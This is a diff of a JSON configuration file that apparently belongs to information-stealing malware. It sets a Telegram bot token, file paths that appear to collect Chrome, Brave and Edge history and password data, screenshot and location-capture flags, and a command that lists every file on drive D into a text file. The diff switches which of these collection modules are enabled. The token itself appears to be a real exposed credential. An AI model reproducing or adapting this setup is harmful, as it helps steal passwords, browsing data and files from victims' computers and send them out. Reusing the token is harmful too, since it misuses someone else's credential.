@@ -1,7 +1,7 @@
 {
   "botToken": "7805542768:AAHg6PTQMX8eWE2S0I4bKxc-WHBoioAIA9I",
-  "hstChrFilePath": "c:\\temp\\cr_hi.txt",
-  "pasChrFilePath": "c:\\temp\\cr_pr.txt",
+  "_hstChrFilePath": "c:\\temp\\cr_hi.txt",
+  "_pasChrFilePath": "c:\\temp\\cr_pr.txt",
   "_hstBrvFilePath": "c:\\temp\\bv_hi.txt",
   "_pasBrvFilePath": "c:\\temp\\bv_pr.txt",
   "_hstEdgFilePath": "c:\\temp\\eg_hi.txt",
@@ -18,6 +18,6 @@
   "_scrShotIs": true,
   "_pcCurrentLocIs": true,
   "_createFilePath": "c:\\Temp\\string2.txt",
-  "_cmdCommandsList": ["dir D:\\ /s /b >> \"C:\\Temp\\string2.txt\""]
+  "cmdCommandsList": ["dir D:\\ /s /b >> \"C:\\Temp\\string2.txt\""]
   
 }
